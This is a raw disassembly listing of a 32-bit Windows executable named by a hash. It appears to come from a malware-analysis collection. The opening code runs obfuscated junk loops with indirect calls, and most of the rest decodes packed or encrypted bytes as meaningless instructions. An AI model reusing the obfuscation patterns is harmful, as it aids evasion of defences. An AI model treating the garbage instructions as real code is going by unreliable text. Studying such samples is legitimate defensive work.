
e22a77db2308908a70b8a10aa6b582d42cb361244b178f0a6c3c51999a5dfd53.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	movzx  ecx,BYTE PTR ds:0x42fd0d
  401012:	mov    DWORD PTR [ebp-0x20],eax
  401015:	mov    ecx,DWORD PTR [ebp-0x20]
  401018:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40101f:	mov    DWORD PTR ds:0x42fd09,0x6cee
  401029:	cmp    ecx,eax
  40102b:	mov    DWORD PTR ds:0x42e11c,0x6120
  401035:	jne    0x402968
  40103b:	or     ecx,0x42d0
  401041:	mov    ax,WORD PTR [ebp-0x24]
  401045:	adc    DWORD PTR ds:0x42fcf1,edx
  40104b:	push   esi
  40104c:	and    DWORD PTR ds:0x42fcd9,0x0
  401056:	jmp    0x401068
  40105b:	mov    ecx,DWORD PTR ds:0x42fcd9
  401061:	inc    ecx
  401062:	mov    DWORD PTR ds:0x42fcd9,ecx
  401068:	cmp    DWORD PTR ds:0x42fcd9,0x1a
  40106f:	jae    0x4010b5
  401075:	cmp    DWORD PTR ds:0x42fcd9,0xf
  40107c:	jne    0x401090
  401082:	push   0x23a3
  401087:	push   DWORD PTR [ebp-0x10]
  40108a:	call   DWORD PTR ds:0x42e527
  401090:	cmp    DWORD PTR ds:0x42fcd9,0xe
  401097:	jne    0x4010aa
  40109d:	mov    ecx,DWORD PTR ds:0x42fcd9
  4010a3:	inc    ecx
  4010a4:	mov    DWORD PTR ds:0x42fcd9,ecx
  4010aa:	jmp    0x40105b
  4010af:	add    DWORD PTR ds:0x42e124,edx
  4010b5:	mov    ecx,0x8a3e
  4010ba:	xor    ax,cx
  4010bd:	sub    ecx,DWORD PTR ds:0x42e70b
  4010c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4010c6:	mov    DWORD PTR ds:0x42e6fb,0x11
  4010d0:	cmp    DWORD PTR ds:0x42e6fb,0x0
  4010d7:	je     0x4011ef
  4010dd:	cmp    DWORD PTR ds:0x42e6fb,0x8
  4010e4:	jne    0x401100
  4010ea:	push   0x42e128
  4010ef:	push   DWORD PTR [ebp-0x10]
  4010f2:	push   0x671d
  4010f7:	push   DWORD PTR [ebp-0x20]
  4010fa:	call   DWORD PTR ds:0x42e2cf
  401100:	cmp    DWORD PTR ds:0x42e6fb,0x9
  401107:	jne    0x40111c
  40110d:	xor    esi,esi
  40110f:	xor    esi,DWORD PTR ds:0x42e6fb
  401115:	dec    esi
  401116:	mov    DWORD PTR ds:0x42e6fb,esi
  40111c:	mov    esi,DWORD PTR ds:0x42e6fb
  401122:	dec    esi
  401123:	mov    DWORD PTR ds:0x42e6fb,esi
  401129:	jmp    0x4010d0
  40112e:	and    DWORD PTR ds:0x42e11c,0x0
  401138:	mov    esi,DWORD PTR ds:0x42e11c
  40113e:	inc    esi
  40113f:	mov    DWORD PTR ds:0x42e11c,esi
  401145:	cmp    DWORD PTR ds:0x42e11c,0xd
  40114c:	jne    0x401160
  401152:	push   0x3999
  401157:	push   DWORD PTR [ebp-0x20]
  40115a:	call   DWORD PTR ds:0x42e52b
  401160:	cmp    DWORD PTR ds:0x42e11c,0xc
  401167:	jne    0x40117c
  40116d:	xor    esi,esi
  40116f:	add    esi,DWORD PTR ds:0x42e11c
  401175:	inc    esi
  401176:	mov    DWORD PTR ds:0x42e11c,esi
  40117c:	cmp    DWORD PTR ds:0x42e11c,0x15
  401183:	jb     0x401138
  401189:	mov    DWORD PTR ds:0x42e134,0x1a
  401193:	cmp    DWORD PTR ds:0x42e134,0x0
  40119a:	je     0x4011ef
  4011a0:	cmp    DWORD PTR ds:0x42e134,0x25
  4011a7:	jne    0x4011d5
  4011ad:	push   0x42fd7a
  4011b2:	push   DWORD PTR [ebp-0x20]
  4011b5:	push   0x4679
  4011ba:	push   0x42fd82
  4011bf:	push   0x17d1
  4011c4:	push   0x42e227
  4011c9:	push   DWORD PTR [ebp-0x14]
  4011cc:	push   DWORD PTR [ebp-0x18]
  4011cf:	call   DWORD PTR ds:0x42e44b
  4011d5:	xor    esi,esi
  4011d7:	or     esi,DWORD PTR ds:0x42e134
  4011dd:	dec    esi
  4011de:	mov    DWORD PTR ds:0x42e134,esi
  4011e4:	jmp    0x401193
  4011e9:	add    DWORD PTR ds:0x42e6fb,ecx
  4011ef:	push   edi
  4011f0:	xor    esi,esi
  4011f2:	or     esi,DWORD PTR ds:0x42fd05
  4011f8:	adc    esi,DWORD PTR ds:0x42fd09
  4011fe:	mov    DWORD PTR ds:0x42fd05,esi
  401204:	mov    edi,0x3b04
  401209:	add    ax,di
  40120c:	mov    DWORD PTR ds:0x42e703,0x17
  401216:	cmp    DWORD PTR ds:0x42e703,0x0
  40121d:	je     0x401257
  401223:	cmp    DWORD PTR ds:0x42e703,0x26
  40122a:	jne    0x401243
  401230:	push   DWORD PTR [ebp-0x10]
  401233:	push   0x42e1c6
  401238:	push   0x42e17d
  40123d:	call   DWORD PTR ds:0x42e52f
  401243:	xor    esi,esi
  401245:	or     esi,DWORD PTR ds:0x42e703
  40124b:	dec    esi
  40124c:	mov    DWORD PTR ds:0x42e703,esi
  401252:	jmp    0x401216
  401257:	movzx  eax,ax
  40125a:	not    eax
  40125c:	and    eax,DWORD PTR [ecx]
  40125e:	mov    ecx,DWORD PTR [ebp+0x8]
  401261:	mov    DWORD PTR ds:0x42fd7e,0x12
  40126b:	cmp    DWORD PTR ds:0x42fd7e,0x0
  401272:	je     0x4012b2
  401278:	cmp    DWORD PTR ds:0x42fd7e,0x22
  40127f:	jne    0x4012a0
  401285:	push   0x42e227
  40128a:	push   0x7fee
  40128f:	push   DWORD PTR [ebp-0x28]
  401292:	push   DWORD PTR [ebp-0x24]
  401295:	push   0x4b6b
  40129a:	call   DWORD PTR ds:0x42e533
  4012a0:	mov    esi,DWORD PTR ds:0x42fd7e
  4012a6:	dec    esi
  4012a7:	mov    DWORD PTR ds:0x42fd7e,esi
  4012ad:	jmp    0x40126b
  4012b2:	mov    DWORD PTR [ecx],eax
  4012b4:	mov    ecx,0x7510855
  4012b9:	mov    esi,0x32729c
  4012be:	push   ebx
  4012bf:	mov    ax,WORD PTR [ebp-0x24]
  4012c3:	movzx  eax,ax
  4012c6:	mov    DWORD PTR [ebp-0x38],eax
  4012c9:	mov    eax,DWORD PTR [ebp+0x8]
  4012cc:	mov    DWORD PTR [ebp-0x28],eax
  4012cf:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  4012d6:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4012dd:	mov    eax,0x9577
  4012e2:	jmp    0x4014ff
  4012e7:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  4012ee:	cdq    
  4012ef:	js     0x401291
  4012f1:	mov    ah,0x66
  4012f3:	push   ebx
  4012f4:	rcr    DWORD PTR [edx],0xfe
  4012f7:	jo     0x401369
  4012f9:	jo     0x40136b
  4012fb:	jo     0x40137b
  4012fd:	jo     0x40136f
  4012ff:	rcl    bh,0x3d
  401302:	aad    0x39
  401304:	ror    edi,cl
  401306:	rol    edx,1
  401308:	pop    es
  401309:	push   es
  40130a:	add    eax,DWORD PTR [eax]
  40130c:	lods   eax,DWORD PTR ds:[esi]
  40130d:	add    cl,BYTE PTR [edi]
  40130f:	xor    ecx,DWORD PTR [edi]
  401311:	ret    0xc71a
  401314:	adc    bl,BYTE PTR [edi]
  401316:	mov    ecx,0xddb7025a
  40131b:	add    bh,ch
  40131d:	mov    ebp,0x8003c8db
  401322:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401328:	lods   eax,DWORD PTR ds:[esi]
  401329:	sar    BYTE PTR [eax+0x6fee581f],1
  40132f:	or     edx,DWORD PTR [ecx]
  401331:	sahf   
  401332:	jp     0x4012fc
  401334:	inc    edx
  401335:	lods   al,BYTE PTR ds:[esi]
  401336:	push   ebx
  401337:	sub    eax,0xad3ec6d1
  40133c:	mov    WORD PTR [ebx-0x3b],?
  40133f:	stos   DWORD PTR es:[edi],eax
  401340:	js     0x401308
  401342:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401348:	jmp    0x40137c
  40134a:	mov    ebp,ecx
  40134c:	dec    edi
  40134d:	fcomp  DWORD PTR [eax-0x656800bf]
  401353:	pop    es
  401354:	test   eax,0xed4dbddc
  401359:	sub    BYTE PTR [ebp+0x23],dl
  40135c:	mov    ah,0xec
  40135e:	pusha  
  40135f:	nop
  401360:	mov    esi,0x94c3117b
  401365:	and    esi,edx
  401367:	jmp    0x4013b9
  401369:	(bad)  
  40136a:	out    0xba,al
  40136c:	repnz in al,dx
  40136e:	xchg   esp,eax
  40136f:	xor    edi,ecx
  401371:	jbe    0x4013d8
  401373:	xlat   BYTE PTR ds:[ebx]
  401374:	and    cl,ch
  401376:	add    al,0xd9
  401378:	adc    DWORD PTR [ecx-0x68],edx
  40137b:	xor    eax,0x7a616f03
  401380:	or     dh,BYTE PTR [ecx]
  401382:	fld    QWORD PTR [eax+0x7f752a56]
  401388:	xor    BYTE PTR [edi+0xba8db0c],cl
  40138e:	pop    ebx
  40138f:	push   ebp
  401390:	(bad)  
  401392:	or     ebx,edx
  401394:	pop    esi
  401395:	fstp   DWORD PTR [ecx]
  401397:	jno    0x401329
  401399:	mov    eax,0x2b15374b
  40139e:	ja     0x4013c9
  4013a0:	sbb    al,0xd3
  4013a2:	xor    BYTE PTR [edi-0x16],cl
  4013a5:	into   
  4013a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013a7:	or     DWORD PTR [edi-0x19],esp
  4013aa:	int3   
  4013ab:	and    DWORD PTR [esi],ecx
  4013ad:	inc    ebx
  4013ae:	mov    dh,0x49
  4013b0:	sbb    BYTE PTR [esi-0x4c1ea03d],bl
  4013b6:	xor    al,0x40
  4013b8:	adc    eax,DWORD PTR [ebx-0x33]
  4013bb:	(bad)  
  4013bc:	pop    ecx
  4013bd:	daa    
  4013be:	out    dx,al
  4013bf:	xor    edx,eax
  4013c1:	mov    eax,ds:0x1ce4b3ec
  4013c6:	repnz mov al,0xa2
  4013c9:	test   al,0xd0
  4013cb:	add    ebx,edx
  4013cd:	shl    DWORD PTR [ecx-0x77],1
  4013d0:	mov    ecx,0x8556caee
  4013d5:	push   0xff1dde69
  4013da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013db:	push   0xffffffe3
  4013dd:	xchg   edx,eax
  4013de:	mov    edi,0x7469399a
  4013e3:	inc    ebx
  4013e4:	aam    0x95
  4013e6:	sbb    ebp,DWORD PTR [esi+0x2a]
  4013e9:	jl     0x401371
  4013eb:	xor    al,BYTE PTR [ecx+eiz*2-0x73]
  4013ef:	popa   
  4013f0:	js     0x4013c4
  4013f2:	push   esi
  4013f3:	rol    bl,1
  4013f5:	(bad)  
  4013f6:	loop   0x401432
  4013f8:	ins    DWORD PTR es:[edi],dx
  4013f9:	outs   dx,DWORD PTR ds:[esi]
  4013fa:	addr16 mov ecx,0x19a5bda2
  401400:	dec    ebx
  401401:	retf   
  401402:	loop   0x40139d
  401404:	hlt    
  401405:	xchg   esp,eax
  401406:	jbe    0x401401
  401408:	dec    eax
  401409:	adc    BYTE PTR [esi],cl
  40140b:	stc    
  40140c:	js     0x4013c8
  40140e:	push   cs
  40140f:	stc    
  401410:	pop    esi
  401411:	and    ah,BYTE PTR [edi+0x3b]
  401414:	lea    esp,[ecx+0x34]
  401417:	inc    edi
  401418:	push   0x9ca96595
  40141d:	test   ebp,edi
  40141f:	aaa    
  401420:	inc    ecx
  401421:	stc    
  401422:	rcl    BYTE PTR [ebx+0x77],cl
  401425:	sahf   
  401426:	dec    DWORD PTR [ebx+edx*8-0x2f2ec94a]
  40142d:	mov    dh,0x32
  40142f:	pop    ds
  401430:	fadd   QWORD PTR [esi+0x10]
  401433:	and    al,bh
  401435:	call   0x7c3d:0x6e378e57
  40143c:	xor    DWORD PTR [ebp+0x1c931f8a],esi
  401442:	adc    dh,al
  401444:	jmp    0x9fd4a5f4
  401449:	int    0xcc
  40144b:	pop    esp
  40144c:	mov    DWORD PTR [esi+0x6f],ecx
  40144f:	inc    eax
  401450:	(bad)  
  401452:	sahf   
  401453:	mov    esi,0x93ba91b
  401458:	xor    ch,BYTE PTR [edi+0x2a0843de]
  40145e:	loope  0x4014a7
  401460:	dec    ecx
  401461:	cmc    
  401462:	pop    edi
  401463:	fist   WORD PTR [edi]
  401465:	sbb    esi,edx
  401467:	hlt    
  401468:	adc    al,0xe9
  40146a:	mov    ch,0xd
  40146c:	push   ss
  40146d:	and    eax,0x782a9cbf
  401472:	xor    eax,0x6418705a
  401477:	push   esp
  401478:	out    dx,eax
  401479:	xor    BYTE PTR [edi],cl
  40147b:	inc    edx
  40147c:	clc    
  40147d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40147e:	jb     0x4014e3
  401480:	mov    dl,BYTE PTR [esi-0x43647d9b]
  401486:	push   ebx
  401487:	add    edi,DWORD PTR [eax+0x63315c17]
  40148d:	inc    esi
  40148e:	jl     0x4014fd
  401490:	inc    edx
  401491:	das    
  401492:	rcl    cl,cl
  401494:	(bad)  [eax+0x5b]
  401497:	inc    eax
  401498:	xor    bh,BYTE PTR [ecx+0x61]
  40149b:	xor    eax,0x235060dc
  4014a0:	cmp    BYTE PTR [edi+0x11862de6],al
  4014a6:	pop    ss
  4014a7:	(bad)  
  4014a8:	sub    eax,0xf6b60675
  4014ad:	mov    DWORD PTR [eax-0x6fa1b3a6],0x5a02f86c
  4014b7:	push   0x11
  4014b9:	sti    
  4014ba:	out    dx,eax
  4014bb:	bound  esp,QWORD PTR [eax]
  4014bd:	jns    0x401471
  4014bf:	addr16 jns 0x401495
  4014c2:	aad    0x9f
  4014c4:	rcr    dl,1
  4014c6:	inc    ebp
  4014c7:	shl    BYTE PTR [ebx],1
  4014c9:	fistp  QWORD PTR [ecx]
  4014cb:	out    dx,al
  4014cc:	xchg   ecx,eax
  4014cd:	cli    
  4014ce:	add    ah,al
  4014d0:	shl    cl,cl
  4014d2:	lods   al,BYTE PTR ds:[esi]
  4014d3:	daa    
  4014d4:	inc    edx
  4014d5:	push   es
  4014d6:	or     eax,0xbc6b3d64
  4014db:	addr16 mov ch,0x26
  4014de:	adc    al,BYTE PTR [ebx+eiz*4]
  4014e1:	jo     0x40149d
  4014e3:	pop    ds
  4014e4:	jl     0x4014f0
  4014e6:	mov    bl,cl
  4014e8:	dec    edx
  4014e9:	ror    bh,1
  4014eb:	push   es
  4014ec:	stc    
  4014ed:	mov    dl,0xac
  4014ef:	jle    0x40151a
  4014f1:	fiadd  DWORD PTR [edi-0x6c]
  4014f4:	retf   
  4014f5:	cld    
  4014f6:	loopne 0x4014c3
  4014f8:	in     al,0xa0
  4014fa:	push   esi
  4014fb:	and    al,0x24
  4014fd:	xor    BYTE PTR [ebx-0x3ba769a],ch
  401503:	jmp    0x401720
  401508:	clc    
  401509:	icebp  
  40150a:	mov    esp,0xb8b16984
  40150f:	icebp  
  401510:	ficomp DWORD PTR [edx-0x557ae013]
  401516:	inc    esp
  401517:	jb     0x401589
  401519:	jle    0x40158b
  40151b:	jo     0x40158d
  40151d:	jle    0x40158f
  40151f:	jo     0x4014ae
  401521:	cmp    eax,0xde35f8c6
  401526:	ins    BYTE PTR es:[edi],dx
  401527:	xchg   ebx,eax
  401528:	je     0x401587
  40152a:	adc    dh,BYTE PTR [ebp+0x35037da9]
  401530:	lahf   
  401531:	xlat   BYTE PTR ds:[ebx]
  401532:	clc    
  401533:	and    ebx,DWORD PTR [edi-0x463e3383]
  401539:	cmp    BYTE PTR [edx+ebp*1+0x6afccb41],bh
  401540:	cmp    al,0x4f
  401543:	retf   0x8ea9
  401546:	pop    ds
  401547:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401548:	or     BYTE PTR [edi-0x7e8bfab],dl
  40154e:	bound  edx,QWORD PTR [edx]
  401550:	sub    esi,ecx
  401552:	(bad)  
  401553:	das    
  401554:	daa    
  401555:	stc    
  401556:	jp     0x40155a
  401558:	add    eax,0x1ae105e7
  40155d:	loope  0x40151c
  40155f:	sahf   
  401560:	test   al,0xea
  401562:	call   0x86a0:0x14f159a
  401569:	les    ebx,FWORD PTR [ecx-0x6b]
  40156c:	dec    esp
  40156d:	mov    bl,BYTE PTR [eax+0x1b]
  401570:	xchg   DWORD PTR [esi+0x62b148e5],esi
  401576:	pop    edx
  401577:	imul   DWORD PTR [edx]
  401579:	xchg   esi,eax
  40157a:	jmp    0x7a4084ef
  40157f:	out    dx,al
  401580:	sub    al,0x5
  401582:	fcmove st,st(7)
  401584:	std    
  401585:	mov    dh,0x18
  401587:	popf   
  401588:	into   
  401589:	inc    ebx
  40158a:	cmp    cl,bl
  40158c:	add    ch,BYTE PTR [edi+0x17]
  40158f:	pop    es
  401590:	mov    ch,0x27
  401592:	jmp    0xf31bdee6
  401597:	jns    0x4015c1
  401599:	scas   eax,DWORD PTR es:[edi]
  40159a:	aad    0x2b
  40159c:	mov    eax,0xd2f8f87c
  4015a1:	mov    esi,0x70d6e57a
  4015a6:	aaa    
  4015a7:	xlat   BYTE PTR ds:[ebx]
  4015a8:	js     0x4015c4
  4015aa:	stos   DWORD PTR es:[edi],eax
  4015ab:	push   esp
  4015ac:	pop    esp
  4015ad:	fmul   DWORD PTR [esp+eax*1+0x7]
  4015b1:	mov    edi,0x43e8725e
  4015b6:	and    bl,bh
  4015b8:	aas    
  4015b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015ba:	loopne 0x4015e1
  4015bc:	jns    0x4015ba
  4015be:	and    DWORD PTR [edx],0xc50aa814
  4015c4:	sbb    DWORD PTR [edi+0x62b56688],esi
  4015ca:	cmp    DWORD PTR [edx-0x36],esi
  4015cd:	inc    ecx
  4015ce:	in     al,0xc0
  4015d0:	icebp  
  4015d1:	pop    ss
  4015d2:	push   ebp
  4015d3:	mov    edi,0x263f9db
  4015d8:	inc    edi
  4015d9:	scas   al,BYTE PTR es:[edi]
  4015da:	jmp    0xde1f:0x9f307f5b
  4015e1:	cld    
  4015e2:	loopne 0x4015d3
  4015e4:	popf   
  4015e5:	dec    edx
  4015e6:	stc    
  4015e7:	mov    al,fs:0x1f67f89c
  4015ed:	or     DWORD PTR [ebp-0x2e],ebx
  4015f0:	and    BYTE PTR [esi-0x35],al
  4015f3:	or     esi,DWORD PTR [eax]
  4015f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015f6:	shl    bh,1
  4015f8:	ffree  st(4)
  4015fa:	sbb    BYTE PTR [ecx+0xf],ch
  4015fd:	ins    BYTE PTR es:[edi],dx
  4015fe:	(bad)  
  4015ff:	lods   al,BYTE PTR ds:[esi]
  401600:	xor    al,0x3b
  401602:	lods   eax,DWORD PTR ds:[esi]
  401603:	xchg   esp,eax
  401604:	inc    edi
  401605:	mov    esp,0xc7b8f481
  40160a:	sbb    dl,BYTE PTR [eax+0x5138f3b9]
  401610:	push   ss
  401611:	popf   
  401612:	and    al,BYTE PTR [ebp+0x6b]
  401615:	outs   dx,DWORD PTR ds:[esi]
  401616:	in     al,dx
  401617:	mov    ds:0x90d443ff,al
  40161c:	push   ss
  40161d:	inc    ebx
  40161e:	inc    eax
  40161f:	enter  0xe96e,0xe1
  401623:	xor    eax,0xc2d5fc8b
  401628:	and    al,0x9e
  40162a:	(bad)  
  40162b:	daa    
  40162c:	mov    eax,0x37e58343
  401631:	mov    cl,al
  401633:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401634:	adc    ebx,DWORD PTR [edi]
  401636:	xor    al,0x4c
  401638:	xchg   DWORD PTR ss:[ecx+0x11388fb8],ecx
  40163f:	loopne 0x4015ce
  401641:	jns    0x40164a
  401643:	fisub  WORD PTR [esi]
  401645:	jecxz  0x4016ab
  401647:	mov    ebp,0x19a74d7e
  40164c:	cmp    eax,0x88e5fafd
  401651:	retf   0x3e1a
  401654:	loope  0x401627
  401656:	shl    DWORD PTR [edx+0x5],0x3f
  40165a:	jecxz  0x40162a
  40165c:	ror    BYTE PTR [edi],0xbd
  40165f:	rcr    BYTE PTR [edx],cl
  401661:	xor    DWORD PTR [ebx-0x244f34e1],ebp
  401667:	mov    al,ds:0x3a610a94
  40166c:	pushf  
  40166d:	pop    ebp
  40166e:	mov    ah,0x8f
  401670:	fistp  WORD PTR [edx-0x2d]
  401673:	xchg   edx,eax
  401674:	mov    ebx,0x5e6eddf8
  401679:	mov    ebp,DWORD PTR [ecx+0x28144fd3]
  40167f:	add    al,0xc1
  401681:	xor    al,0x0
  401683:	and    al,0xae
  401685:	ins    BYTE PTR es:[edi],dx
  401686:	(bad)  
  401687:	(bad)
  40168b:	fwait
  40168c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40168d:	mov    DWORD PTR [eax+0x369313bd],edx
  401693:	in     eax,0x7b
  401695:	sub    dh,BYTE PTR [edi-0x691c7293]
  40169b:	xlat   BYTE PTR ds:[ebx]
  40169c:	cmp    al,0x6e
  40169e:	sbb    ebp,ecx
  4016a0:	out    dx,al
  4016a1:	arpl   WORD PTR ds:0x766fd805,cx
  4016a7:	sub    eax,edi
  4016a9:	xor    dl,BYTE PTR [ecx]
  4016ab:	retf   0x66f4
  4016ae:	dec    esp
  4016af:	neg    DWORD PTR [eax]
  4016b1:	push   ebp
  4016b2:	push   ds
  4016b3:	push   esp
  4016b4:	out    0x1c,al
  4016b6:	push   eax
  4016b7:	(bad)
  4016ba:	frstor [edi-0x348dc3a]
  4016c0:	inc    ebp
  4016c1:	adc    al,0xe6
  4016c3:	push   es
  4016c4:	data16 int 0x59
  4016c7:	ja     0x401708
  4016c9:	rol    BYTE PTR [ecx],1
  4016cb:	dec    edx
  4016cc:	leave  
  4016cd:	sbb    al,0xda
  4016cf:	(bad)  
  4016d0:	xor    al,0x9
  4016d2:	rol    BYTE PTR [ecx+0x54af254],cl
  4016d8:	inc    ebp
  4016d9:	cmp    ecx,DWORD PTR [esi+0x5c]
  4016dc:	push   ds
  4016dd:	or     bl,BYTE PTR [ebx+0x42516add]
  4016e3:	mov    ah,0xc0
  4016e5:	inc    ebp
  4016e6:	add    eax,0x55c21271
  4016eb:	sahf   
  4016ec:	mov    DWORD PTR [ebx-0x4932a5c6],0x7c151eef
  4016f6:	jecxz  0x40174d
  4016f8:	push   ebx
  4016f9:	ror    BYTE PTR [ecx-0x79608ba4],0x45
  401700:	dec    ecx
  401701:	sti    
  401702:	mov    ch,bh
  401704:	fld    DWORD PTR [esp+eax*2+0x30]
  401708:	jle    0x4016ce
  40170a:	add    BYTE PTR [ecx],cl
  40170c:	jle    0x401748
  40170e:	stos   BYTE PTR es:[edi],al
  40170f:	pop    esp
  401710:	out    dx,eax
  401711:	sbb    bh,ch
  401713:	sbb    DWORD PTR [esi],esi
  401715:	sub    al,0xc2
  401717:	jg     0x401768
  401719:	ins    BYTE PTR es:[edi],dx
  40171a:	imul   edx,DWORD PTR [ecx+esi*8-0x726b777e],0x45
  401722:	ror    BYTE PTR [ecx+0x458bcc45],1
  401728:	fmul   DWORD PTR [ecx+0x458dd445]
  40172e:	call   0x42301c
  401733:	add    BYTE PTR [ebp-0x31],cl
  401736:	lods   eax,DWORD PTR ds:[esi]
  401737:	dec    ebx
  401738:	lods   eax,DWORD PTR ds:[esi]
  401739:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  401740:	push   eax
  401741:	outs   dx,BYTE PTR ds:[esi]
  401742:	cs inc esp
  401744:	jo     0x4017c2
  401746:	jo     0x4017b8
  401748:	jo     0x4017c8
  40174a:	jo     0x4017bc
  40174c:	stc    
  40174d:	test   eax,0x1a3b5a4d
  401752:	inc    DWORD PTR [ecx-0x12351602]
  401758:	pop    ebp
  401759:	fst    QWORD PTR [ebp-0x73]
  40175c:	xchg   esp,eax
  40175d:	cld    
  40175e:	mov    edi,0x1a52075c
  401763:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401764:	dec    esp
  401765:	aas    
  401766:	mov    ah,0x73
  401768:	add    al,0xf6
  40176a:	add    al,0x9
  40176c:	and    DWORD PTR [eax],esp
  40176e:	sahf   
  40176f:	cmp    edi,DWORD PTR [esi+0x1ed7cc08]
  401775:	(bad)  
  401777:	push   edx
  401778:	repnz push ds
  40177a:	mov    al,ds:0xa19a227d
  40177f:	pop    ecx
  401780:	xchg   dh,bh
  401782:	jnp    0x40170a
  401784:	or     dh,BYTE PTR [ecx-0x192a8052]
  40178a:	mov    ebp,0xeaf6cdea
  40178f:	or     eax,ebx
  401791:	data16 (bad) 
  401793:	jp     0x401777
  401795:	clc    
  401796:	cmc    
  401797:	sar    BYTE PTR [esi],1
  401799:	pop    edx
  40179a:	nop
  40179b:	jge    0x401726
  40179d:	push   ebx
  40179e:	add    ebp,ecx
  4017a0:	lods   al,BYTE PTR ds:[esi]
  4017a1:	cmc    
  4017a2:	push   ecx
  4017a3:	sbb    ebp,DWORD PTR [edi]
  4017a5:	push   esi
  4017a6:	enter  0xf22e,0x17
  4017aa:	daa    
  4017ab:	cld    
  4017ac:	loope  0x401757
  4017ae:	lods   al,BYTE PTR ds:[esi]
  4017af:	jmp    0x9cd68425
  4017b4:	and    al,0x28
  4017b6:	std    
  4017b7:	xlat   BYTE PTR ds:[ebx]
  4017b8:	icebp  
  4017b9:	and    BYTE PTR [esi-0x76],bh
  4017bc:	jns    0x40177b
  4017be:	jge    0x40174d
  4017c0:	retf   0xf2ec
  4017c3:	adc    DWORD PTR [eax-0x5],esi
  4017c6:	repz adc DWORD PTR [ecx-0x62],ebp
  4017ca:	das    
  4017cb:	adc    dh,0xbe
  4017ce:	mov    dl,0xca
  4017d0:	mov    eax,ds:0x8c4ecd3
  4017d5:	and    DWORD PTR [eax-0x31],eax
  4017d8:	aaa    
  4017d9:	add    DWORD PTR [ecx+0x3abe3674],ebp
  4017df:	sub    ecx,edi
  4017e1:	ret    
  4017e2:	icebp  
  4017e3:	add    BYTE PTR [edx+edi*4],dl
  4017e6:	inc    esi
  4017e7:	lods   eax,DWORD PTR ds:[esi]
  4017e8:	pop    edx
  4017e9:	scas   eax,DWORD PTR es:[edi]
  4017ea:	sub    DWORD PTR [edi+0x4e],esp
  4017ed:	sub    ebp,DWORD PTR [edx-0x55]
  4017f0:	aam    0xae
  4017f2:	sub    esp,eax
  4017f4:	and    ecx,DWORD PTR [ecx-0x47]
  4017f7:	ja     0x40179a
  4017f9:	nop
  4017fa:	das    
  4017fb:	jmp    0x4ad4:0xc9147bfd
  401802:	inc    edx
  401803:	mov    ebp,0xd670726c
  401808:	ja     0x401886
  40180a:	stos   BYTE PTR es:[edi],al
  40180b:	jecxz  0x4017fc
  40180d:	adc    al,0xb3
  40180f:	sbb    DWORD PTR [eax],esi
  401811:	dec    esp
  401812:	sub    BYTE PTR [edx-0x4a],ah
  401815:	sub    BYTE PTR cs:0x6e4e4c09,bh
  40181c:	cmp    al,dh
  40181e:	nop
  40181f:	scas   eax,DWORD PTR es:[edi]
  401820:	sub    DWORD PTR [edi+0x1d7080df],esi
  401826:	daa    
  401827:	dec    edi
  401828:	push   edx
  401829:	retf   
  40182a:	xor    al,BYTE PTR ds:0x81e5366e
  401830:	jb     0x401828
  401832:	mov    ch,BYTE PTR [edx+ebx*8-0x3fef235c]
  401839:	cmc    
  40183a:	and    ebx,eax
  40183c:	ficom  WORD PTR [ecx]
  40183e:	jb     0x401869
  401840:	(bad)  
  401841:	int3   
  401842:	fbstp  TBYTE PTR [ebx-0x36]
  401845:	cdq    
  401846:	jecxz  0x40181b
  401848:	dec    eax
  401849:	ins    DWORD PTR es:[edi],dx
  40184a:	fwait
  40184b:	arpl   WORD PTR [ebx],dx
  40184d:	es (bad) 
  40184f:	adc    DWORD PTR [esi],edi
  401851:	fnstsw WORD PTR [eax]
  401853:	sub    dl,al
  401855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401856:	test   DWORD PTR [eax+0x3ab36b9c],edi
  40185c:	jno    0x401863
  40185e:	adc    al,0x4
  401860:	fidiv  DWORD PTR [ecx+edx*4-0x75ed223a]
  401867:	jg     0x40185e
  401869:	mov    edi,0x46c40d1b
  40186e:	fwait
  40186f:	loop   0x4018c6
  401871:	and    eax,0x5d22c704
  401876:	shl    BYTE PTR [ecx-0x7902db6f],1
  40187c:	call   FWORD PTR [edi-0x24]
  40187f:	pushf  
  401880:	push   es
  401881:	mov    esi,0xbe1fc8fc
  401886:	xor    BYTE PTR [edx+0x6d],cl
  401889:	push   eax
  40188a:	lea    edi,[ebx-0x479b6f16]
  401890:	repnz out 0x39,eax
  401893:	arpl   sp,di
  401895:	add    dh,al
  401897:	loopne 0x401897
  401899:	fsub   st,st(1)
  40189b:	mov    ah,0x7b
  40189d:	xchg   ebp,eax
  40189e:	sub    BYTE PTR [ecx-0x45],0xbf
  4018a2:	sti    
  4018a3:	xchg   edx,eax
  4018a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018a5:	xchg   ebp,eax
  4018a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018a7:	sub    al,BYTE PTR [edx+ebp*4]
  4018aa:	(bad)  
  4018ab:	dec    esi
  4018ac:	and    DWORD PTR [eax+0x72],ebp
  4018af:	cdq    
  4018b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018b1:	adc    al,0x32
  4018b3:	cmp    eax,0x73f38e7f
  4018b8:	nop
  4018b9:	(bad)  
  4018ba:	fldenv [edi]
  4018bc:	sub    BYTE PTR [edx+0x2b],dl
  4018bf:	arpl   WORD PTR [ecx-0x58],cx
